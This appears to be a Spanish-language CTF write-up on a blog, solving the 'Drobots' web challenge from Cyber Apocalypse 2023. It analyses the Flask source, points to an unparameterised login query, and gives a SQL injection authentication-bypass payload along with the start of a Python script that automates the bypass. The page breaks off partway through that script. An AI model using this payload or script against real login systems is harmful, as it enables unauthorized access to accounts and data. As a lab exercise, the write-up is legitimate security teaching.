@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Drobots Cyber Apocalypse 2023</title>
+
+  <meta name="description" content="Resolución del challenge Drobots del Cyber Apocalypse 2023">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Drobots Cyber Apocalypse 2023">
+  <meta name="twitter:description" content="Resolución del challenge Drobots del Cyber Apocalypse 2023">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Drobots Cyber Apocalypse 2023">
+  <meta property="og:description" content="Resolución del challenge Drobots del Cyber Apocalypse 2023">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Drobots Cyber Apocalypse 2023" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/ca2023" title="GatoGamer1155" class="blog-button">Cyber Apocalypse</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Cyber Apocalypse 2023</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Drobots</h2><br>
+  </header>
+
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">En la web podemos ver una página con un login pero no tenemos credenciales validas</p>
+<a href="/ca2023/drobots/1.png" target="_blank"><div><p><img src="/ca2023/drobots/1.png"></p></div></a>
+
+<p class="plain-text">Analizemos los archivos del zip, donde tenemos varios archivos de configuración de docker entre otros y todo el <code class="language-plaintext highlighter-rouge">código fuente</code> del proyecto que es la página web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l
+drwxr-xr-x gato gato  34 B Tue Mar 14 07:16:12 2023 </span><span class="az"> challenge</span><span class="p">
+drwxr-xr-x gato gato  32 B Tue Mar 14 07:16:12 2023 </span><span class="az"> config</span><span class="p">
+.rw-r--r-- gato gato 129 B Tue Mar 14 07:16:12 2023 </span><span class="ve"> build-docker.sh  </span><span class="p">
+.rw-r--r-- gato gato 743 B Tue Mar 14 07:16:12 2023  Dockerfile
+.rw-r--r-- gato gato 899 B Tue Mar 14 07:16:12 2023 </span><span class="ve"> entrypoint.sh</span><span class="p">
+.rw-r--r-- gato gato  26 B Tue Mar 14 07:16:12 2023  flag.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro del directorio <code class="language-plaintext highlighter-rouge">challenge</code> encontramos una carpeta application y un archivo con el nombre <code class="language-plaintext highlighter-rouge">run.py</code> que monta un servidor con python </p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l
+drwxr-xr-x gato gato 138 B Tue Mar 21 15:44:02 2023 </span><span class="az"> application </span><span class="p">  
+.rw-r--r-- gato gato  99 B Tue Mar 14 07:16:12 2023  run.py
+
+</span><span class="ve">❯ cat </span><span class="p">run.py
+</span><span class="o">from </span><span class="p">application.main </span><span class="o">import </span><span class="p">app
+
+app.run(</span><span class="am">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">, </span><span class="am">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">, </span><span class="am">debug</span><span class="o">=</span><span class="mi">False</span><span class="p">, </span><span class="am">use_evalex</span><span class="o">=</span><span class="mi">False</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro de la carpeta <code class="language-plaintext highlighter-rouge">application</code> podemos ver algunas carpetas y varios archivos en python entre ellos el <code class="language-plaintext highlighter-rouge">main.py</code> que es la base del todo el proyecto web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l 
+drwxr-xr-x gato gato  18 B  Tue Mar 14 07:16:12 2023 </span><span class="az"> blueprints</span><span class="p">
+drwxr-xr-x gato gato  22 B  Tue Mar 14 07:18:37 2023 </span><span class="az"> static</span><span class="p">
+drwxr-xr-x gato gato  38 B  Tue Mar 14 07:16:12 2023 </span><span class="az"> templates</span><span class="p">
+.rw-r--r-- gato gato 346 B  Tue Mar 14 07:16:12 2023  config.py
+.rw-r--r-- gato gato 758 B  Tue Mar 14 07:16:12 2023  database.py
+.rw-r--r-- gato gato 483 B  Tue Mar 21 15:23:12 2023  exploit.py
+.rw-r--r-- gato gato 959 B  Tue Mar 14 07:16:12 2023  main.py
+.rw-r--r-- gato gato 1.0 KB Tue Mar 14 07:16:12 2023  util.py
+
+</span><span class="ve">❯ cat </span><span class="p">main.py
+</span><span class="o">from </span><span class="p">flask </span><span class="o">import </span><span class="p">Flask
+</span><span class="o">from </span><span class="p">application.blueprints.routes </span><span class="o">import </span><span class="p">web, api
+</span><span class="o">from </span><span class="p">application.database </span><span class="o">import </span><span class="p">mysql
+</span><span class="o">from </span><span class="p">application.util </span><span class="o">import </span><span class="p">response
+
+app </span><span class="o">= </span><span class="p">Flask(__name__)
+app.config.from_object(</span><span class="s">'application.config.Config'</span><span class="p">)
+
+mysql.init_app(app)
+
+app.register_blueprint(web, </span><span class="am">url_prefix</span><span class="o">=</span><span class="s">'/'</span><span class="p">)
+app.register_blueprint(api, </span><span class="am">url_prefix</span><span class="o">=</span><span class="s">'/api'</span><span class="p">)
+
+@app.errorhandler(</span><span class="mi">404</span><span class="p">)
+</span><span class="o">def </span><span class="na">not_found</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    </span><span class="o">return </span><span class="p">response(</span><span class="s">'404 Not Found'</span><span class="p">), </span><span class="mi">404</span><span class="p">
+
+@app.errorhandler(</span><span class="mi">403</span><span class="p">)
+</span><span class="o">def </span><span class="na">forbidden</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    </span><span class="o">return </span><span class="p">response(</span><span class="s">'403 Forbidden'</span><span class="p">), </span><span class="mi">403</span><span class="p">
+
+@app.errorhandler(</span><span class="mi">400</span><span class="p">)
+</span><span class="o">def </span><span class="na">bad_request</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    </span><span class="o">return </span><span class="p">response(</span><span class="s">'400 Bad Request'</span><span class="p">), </span><span class="mi">400</span><span class="p">
+
+@app.errorhandler(</span><span class="no">Exception</span><span class="p">)
+</span><span class="o">def </span><span class="na">handle_error</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    message </span><span class="o">= </span><span class="p">error.description </span><span class="o">if </span><span class="no">hasattr</span><span class="p">(error, </span><span class="s">'description'</span><span class="p">) </span><span class="o">else</span><span class="p"> [</span><span class="na">str</span><span class="p">(x) </span><span class="o">for </span><span class="p">x </span><span class="o">in </span><span class="p">error.args]  
+    response </span><span class="o">=</span><span class="p"> {
+        </span><span class="s">'error'</span><span class="p">: {
+            </span><span class="s">'type'</span><span class="p">: error.__class__.__name__,
+            </span><span class="s">'message'</span><span class="p">: message
+        }
+    }
+
+    </span><span class="o">return </span><span class="p">response, error.code </span><span class="o">if </span><span class="no">hasattr</span><span class="p">(error, </span><span class="s">'code'</span><span class="p">) </span><span class="o">else </span><span class="mi">500</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de importar modulos inicia una instancia de <code class="language-plaintext highlighter-rouge">Flask</code> a la cual le aplica como configuración la clase <code class="language-plaintext highlighter-rouge">Config</code> del modulo <code class="language-plaintext highlighter-rouge">config.py</code> en la carpeta <code class="language-plaintext highlighter-rouge">application</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">app </span><span class="o">= </span><span class="p">Flask(__name__)
+app.config.from_object(</span><span class="s">'application.config.Config'</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">config.py</code>, la clase <code class="language-plaintext highlighter-rouge">Config</code> define credenciales para la base de datos y un <code class="language-plaintext highlighter-rouge">SECRET_KEY</code> que define usando la funcion <code class="language-plaintext highlighter-rouge">generate</code> del modulo <code class="language-plaintext highlighter-rouge">util.py</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">from </span><span class="p">application.util </span><span class="o">import </span><span class="p">generate  
+
+</span><span class="o">class </span><span class="no">Config</span><span class="p">(</span><span class="na">object</span><span class="p">):
+    SECRET_KEY </span><span class="o">= </span><span class="p">generate(</span><span class="mi">50</span><span class="p">)
+    MYSQL_HOST </span><span class="o">= </span><span class="s">'localhost'</span><span class="p">
+    MYSQL_USER </span><span class="o">= </span><span class="s">'user'</span><span class="p">
+    MYSQL_PASSWORD </span><span class="o">= </span><span class="s">'M@k3l@R!d3s$'</span><span class="p">
+    MYSQL_DB </span><span class="o">= </span><span class="s">'drobots'
+
+</span><span class="o">class </span><span class="no">ProductionConfig</span><span class="p">(</span><span class="na">Config</span><span class="p">):
+    </span><span class="o">pass
+
+</span><span class="o">class </span><span class="no">DevelopmentConfig</span><span class="p">(</span><span class="na">Config</span><span class="p">):
+    DEBUG </span><span class="o">= </span><span class="mi">True
+
+</span><span class="o">class </span><span class="no">TestingConfig</span><span class="p">(</span><span class="na">Config</span><span class="p">):
+    TESTING </span><span class="o">= </span><span class="mi">True</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">generate</code> en el <code class="language-plaintext highlighter-rouge">util.py</code> una la función <code class="language-plaintext highlighter-rouge">os.urandom</code> para generar una cantidad de bytes aleatorios donde la cantidad de bytes se especifica como argumento, despues de generarla lo convierte a hexadecimal usando <code class="language-plaintext highlighter-rouge">hex</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">generate </span><span class="o">= lambda </span><span class="am">x</span><span class="p">: os.urandom(x).hex()  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvamos a el main donde se registran 2 <code class="language-plaintext highlighter-rouge">blueprints</code> los cuales definen que si se usa <code class="language-plaintext highlighter-rouge">web</code> apuntara a la ruta <code class="language-plaintext highlighter-rouge">/</code> por otro lado si se usa <code class="language-plaintext highlighter-rouge">api</code> apuntará a la ruta <code class="language-plaintext highlighter-rouge">/api</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">app.register_blueprint(web, </span><span class="am">url_prefix</span><span class="o">=</span><span class="s">'/'</span><span class="p">)
+app.register_blueprint(api, </span><span class="am">url_prefix</span><span class="o">=</span><span class="s">'/api'</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De resto define la <code class="language-plaintext highlighter-rouge">respuesta</code> de cada uno de los codigos de estado de posibles errores usando la función <code class="language-plaintext highlighter-rouge">response</code> para mostrar el mensaje para el caso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">@app.errorhandler(</span><span class="mi">404</span><span class="p">)
+</span><span class="o">def </span><span class="na">not_found</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    </span><span class="o">return </span><span class="p">response(</span><span class="s">'404 Not Found'</span><span class="p">), </span><span class="mi">404</span><span class="p">
+
+@app.errorhandler(</span><span class="mi">403</span><span class="p">)
+</span><span class="o">def </span><span class="na">forbidden</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    </span><span class="o">return </span><span class="p">response(</span><span class="s">'403 Forbidden'</span><span class="p">), </span><span class="mi">403</span><span class="p">
+
+@app.errorhandler(</span><span class="mi">400</span><span class="p">)
+</span><span class="o">def </span><span class="na">bad_request</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    </span><span class="o">return </span><span class="p">response(</span><span class="s">'400 Bad Request'</span><span class="p">), </span><span class="mi">400</span><span class="p">
+
+@app.errorhandler(</span><span class="no">Exception</span><span class="p">)
+</span><span class="o">def </span><span class="na">handle_error</span><span class="p">(</span><span class="am">error</span><span class="p">):
+    message </span><span class="o">= </span><span class="p">error.description </span><span class="o">if </span><span class="no">hasattr</span><span class="p">(error, </span><span class="s">'description'</span><span class="p">) </span><span class="o">else</span><span class="p"> [</span><span class="na">str</span><span class="p">(x) </span><span class="o">for </span><span class="p">x </span><span class="o">in </span><span class="p">error.args]  
+    response </span><span class="o">=</span><span class="p"> {
+        </span><span class="s">'error'</span><span class="p">: {
+            </span><span class="s">'type'</span><span class="p">: error.__class__.__name__,
+            </span><span class="s">'message'</span><span class="p">: message
+        }
+    }
+
+    </span><span class="o">return </span><span class="p">response, error.code </span><span class="o">if </span><span class="no">hasattr</span><span class="p">(error, </span><span class="s">'code'</span><span class="p">) </span><span class="o">else </span><span class="mi">500</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">response</code> de define en <code class="language-plaintext highlighter-rouge">util.py</code> la cual devuelve un <code class="language-plaintext highlighter-rouge">json</code> con un campo <code class="language-plaintext highlighter-rouge">message</code> el cual como contenido tiene el argumento que se le pase al llamarla</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def </span><span class="na">response</span><span class="p">(</span><span class="am">message</span><span class="p">):
+    </span><span class="o">return </span><span class="p">jsonify({</span><span class="s">'message'</span><span class="p">: message})  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vamos a el <code class="language-plaintext highlighter-rouge">routes.py</code> donde se definen los <code class="language-plaintext highlighter-rouge">blueprint</code>, inicia importando algunos modulos y definiendo las variables <code class="language-plaintext highlighter-rouge">web</code> y <code class="language-plaintext highlighter-rouge">api</code> que son los blueprint que vimos antes además abre el archivo <code class="language-plaintext highlighter-rouge">flag.txt</code> y guarda su contenido en una variable <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">web </span><span class="o">= </span><span class="p">Blueprint(</span><span class="s">'web'</span><span class="p">, __name__)
+api </span><span class="o">= </span><span class="p">Blueprint(</span><span class="s">'api'</span><span class="p">, __name__)  
+
+flag </span><span class="o">= </span><span class="no">open</span><span class="p">(</span><span class="s">'/flag.txt'</span><span class="p">).read()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Más abajo tenemos definida la ruta <code class="language-plaintext highlighter-rouge">/</code> que al apuntar a ella te muestra el <code class="language-plaintext highlighter-rouge">login.html</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">@web.route(</span><span class="s">'/'</span><span class="p">)
+</span><span class="o">def </span><span class="na">signIn</span><span class="p">():
+    </span><span class="o">return </span><span class="p">render_template(</span><span class="s">'login.html'</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando apuntemos a <code class="language-plaintext highlighter-rouge">/logout</code> nos desloguea igualando el valor <code class="language-plaintext highlighter-rouge">auth</code> de la sesión a <code class="language-plaintext highlighter-rouge">None</code> para eliminar la cookie y nos redirige a <code class="language-plaintext highlighter-rouge">/</code> para loguearnos de nuevo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">@web.route(</span><span class="s">'/logout'</span><span class="p">)
+</span><span class="o">def </span><span class="na">logout</span><span class="p">():
+    session[</span><span class="s">'auth'</span><span class="p">] </span><span class="o">= </span><span class="mi">None  </span><span class="p">
+    </span><span class="o">return </span><span class="p">redirect(</span><span class="s">'/'</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si apuntamos a <code class="language-plaintext highlighter-rouge">/home</code> nos muestra el <code class="language-plaintext highlighter-rouge">home.html</code> al cual le pasa un valor <code class="language-plaintext highlighter-rouge">flag</code> que es el flag.txt que abre, pero antes de llevarnos ahi usa la función <code class="language-plaintext highlighter-rouge">isAuthenticated</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">@web.route(</span><span class="s">'/home'</span><span class="p">)
+@isAuthenticated
+</span><span class="o">def </span><span class="na">home</span><span class="p">():
+    </span><span class="o">return </span><span class="p">render_template(</span><span class="s">'home.html'</span><span class="p">, </span><span class="am">flag</span><span class="o">=</span><span class="p">flag)</span>  
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta función es usada en <code class="language-plaintext highlighter-rouge">util.py</code> la cual extrae el valor <code class="language-plaintext highlighter-rouge">auth</code> y verifica que exista de no ser asi devuelve <code class="language-plaintext highlighter-rouge">401</code> si existe verifica que el <code class="language-plaintext highlighter-rouge">token</code> sea valido usando <code class="language-plaintext highlighter-rouge">verifyJWT</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def </span><span class="na">isAuthenticated</span><span class="p">(</span><span class="am">f</span><span class="p">):
+    @wraps(f)
+    </span><span class="o">def </span><span class="na">decorator</span><span class="p">(</span><span class="o">*</span><span class="am">args</span><span class="p">,</span><span class="o"> **</span><span class="am">kwargs</span><span class="p">):
+        token </span><span class="o">= </span><span class="p">session.get(</span><span class="s">'auth'</span><span class="p">)
+
+        </span><span class="o">if not </span><span class="p">token:
+            </span><span class="o">return </span><span class="p">abort(</span><span class="mi">401</span><span class="p">, </span><span class="s">'Unauthorised access detected!'</span><span class="p">)  
+
+        verifyJWT(token)
+
+        </span><span class="o">return </span><span class="no">f</span><span class="p">(</span><span class="o">*</span><span class="p">args, </span><span class="o">**</span><span class="p">kwargs)
+
+    </span><span class="o">return </span><span class="p">decorator</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">verifyJWT</code> recibe el <code class="language-plaintext highlighter-rouge">token</code> y lo decodea usando la <code class="language-plaintext highlighter-rouge">key</code> que define arriba con el algoritmo <code class="language-plaintext highlighter-rouge">HS256</code>, si el resultado no es correcto devuelve <code class="language-plaintext highlighter-rouge">400</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def </span><span class="na">verifyJWT</span><span class="p">(</span><span class="am">token</span><span class="p">):
+    </span><span class="o">try</span><span class="p">:
+        token_decode </span><span class="o">= </span><span class="p">jwt.decode(
+            token,
+            key,
+            </span><span class="am">algorithms</span><span class="o">=</span><span class="s">'HS256'</span><span class="p">
+        )
+
+        </span><span class="o">return </span><span class="p">token_decode
+    </span><span class="o">except</span><span class="p">:
+        </span><span class="o">return </span><span class="p">abort(</span><span class="mi">400</span><span class="p">,</span><span class="s"> 'Invalid token!'</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volviendo al <code class="language-plaintext highlighter-rouge">routes.py</code> podemos ver la ruta <code class="language-plaintext highlighter-rouge">/login</code> que acepta <code class="language-plaintext highlighter-rouge">POST</code> la necesita recibir una data en <code class="language-plaintext highlighter-rouge">json</code> con los valores <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">password</code> de no ser asi devuelve un error, despues llama a la función <code class="language-plaintext highlighter-rouge">login</code> pasandole las credenciales para definir la variable <code class="language-plaintext highlighter-rouge">user</code> para finalmente si existe igualar el valor auth a esta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">@api.route(</span><span class="s">'/login'</span><span class="p">, </span><span class="am">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])
+</span><span class="o">def </span><span class="na">apiLogin</span><span class="p">():
+    </span><span class="o">if not </span><span class="p">request.is_json:
+        </span><span class="o">return </span><span class="p">response(</span><span class="s">'Invalid JSON!'</span><span class="p">), </span><span class="mi">400</span><span class="p">
+    
+    data </span><span class="o">= </span><span class="p">request.get_json()
+    username </span><span class="o">= </span><span class="p">data.get(</span><span class="s">'username'</span><span class="p">, </span><span class="s">''</span><span class="p">)
+    password </span><span class="o">= </span><span class="p">data.get(</span><span class="s">'password'</span><span class="p">, </span><span class="s">''</span><span class="p">)
+    
+    </span><span class="o">if not </span><span class="p">username </span><span class="o">or not </span><span class="p">password:
+        </span><span class="o">return </span><span class="p">response(</span><span class="s">'All fields are required!'</span><span class="p">), </span><span class="mi">401  </span><span class="p">
+    
+    user </span><span class="o">= </span><span class="p">login(username, password)
+    
+    </span><span class="o">if </span><span class="p">user:
+        session[</span><span class="s">'auth'</span><span class="p">] </span><span class="o">= </span><span class="p">user
+        return response(</span><span class="s">'Success'</span><span class="p">), </span><span class="mi">200</span><span class="p">
+        
+    </span><span class="o">return </span><span class="p">response(</span><span class="s">'Invalid credentials!'</span><span class="p">), </span><span class="mi">403</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">login</code> sale del <code class="language-plaintext highlighter-rouge">database.py</code> la cual mediante una <code class="language-plaintext highlighter-rouge">query sql</code> verifica que las credenciales sean validas, si la query es correcta crea el <code class="language-plaintext highlighter-rouge">token</code> y lo retorna</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def </span><span class="na">login</span><span class="p">(</span><span class="am">username</span><span class="p">,</span><span class="am"> password</span><span class="p">):
+</span><span class="c1">    # We should update our code base and use techniques like parameterization to avoid SQL Injection</span><span class="p">
+    user </span><span class="o">= </span><span class="p">query_db(</span><span class="no">f</span><span class="s">'SELECT password FROM users WHERE username = "</span><span class="p">{username}</span><span class="s">" AND password = "</span><span class="p">{password}</span><span class="s">" ', </span><span class="am">one</span><span class="o">=</span><span class="mi">True</span><span class="p">)  
+
+    </span><span class="o">if </span><span class="p">user:
+        token </span><span class="o">= </span><span class="p">createJWT(username)  
+        </span><span class="o">return </span><span class="p">token
+    </span><span class="o">else</span><span class="p">:
+        </span><span class="o">return </span><span class="mi">False</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">La <code class="language-plaintext highlighter-rouge">vulnerabilidad</code> se encuentra aqui ya que si le pasamos un valor de <code class="language-plaintext highlighter-rouge">username</code> como <code class="language-plaintext highlighter-rouge">" or 1=1-- -</code> la <code class="language-plaintext highlighter-rouge">query sql</code> que ejecutaria pasaria a ser la siguiente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">SELECT </span><span class="p">password </span><span class="o">FROM </span><span class="p">users </span><span class="o">WHERE </span><span class="p">username </span><span class="o">= </span><span class="s">"" </span><span class="o">or </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -AND password = "{password}"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La primera parte devolvera que algo incorrecto sin embargo hemos puesto un <code class="language-plaintext highlighter-rouge">or</code> que solo valida <code class="language-plaintext highlighter-rouge">1 si es igual a 1</code> que es correcto, asi la <code class="language-plaintext highlighter-rouge">query sql</code> sera valida</p>
+<a href="/ca2023/drobots/2.png" target="_blank"><div><p><img src="/ca2023/drobots/2.png"></p></div></a>
+
+<p class="plain-text">Al enviar ese valor con una contraseña cualquiera nos loguea y podemos ver la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<a href="/ca2023/drobots/3.png" target="_blank"><div><p><img src="/ca2023/drobots/3.png"></p></div></a>
+
+<p class="plain-text">Podemos automatizarlo en un script en <code class="language-plaintext highlighter-rouge">python</code> en el cual recibimos un <code class="language-plaintext highlighter-rouge">argumento</code> el cual sera <code class="language-plaintext highlighter-rouge">host:port</code> y con este definimos la variable <code class="language-plaintext highlighter-rouge">target</code> que vale la url</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">requests, re, sys
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Uso: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &lthost:port>"</span><span class="p">)  
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+target </span><span class="o">= </span><span class="no">f</span><span class="s">"http://</span><span class="p">{sys.argv[</span><span class="mi">1</span><span class="p">]}</span><span class="s">"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos una <code class="language-plaintext highlighter-rouge">sesión</code> y enviamos una petición con el <code class="language-plaintext highlighter-rouge">payload</code> para loguearnos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">session </span><span class="o">= </span><span class="p">requests.Session()
+
+json </span><span class="o">=</span><span class="p"> {</span><span class="s">"username"</span><span class="p">: </span><span class="s">"admin\" or 1=1-- -"</span><span class="p">, </span><span class="s">"password"</span><span class="p">: </span><span class="s">"admin"</span><span class="p">}  
+session.post(target </span><span class="o">+</span><span class="s"> "/api/login"</span><span class="p">, </span><span class="am">json</span><span class="o">=</span><span class="p">json)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De resto enviamos una petición al <code class="language-plaintext highlighter-rouge">/home</code> y de la respuesta con expresiones regulares buscamos el patrón de la <code class="language-plaintext highlighter-rouge">flag</code> que es <code class="language-plaintext highlighter-rouge">HTB{</code> y <code class="language-plaintext highlighter-rouge">}</code> despues de eso la mostramos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">request </span><span class="o">= </span><span class="p">session.get(target </span><span class="o">+ </span><span class="s">"/home"</span><span class="p">)
+
+pattern </span><span class="o">= </span><span class="p">re.compile(</span><span class="no">r</span><span class="s">"HTB</span><span class="mi">\{</span><span class="p">(</span><span class="mi">.</span><span class="o">+?</span><span class="p">)</span><span class="mi">\}</span><span class="s">"</span><span class="p">)
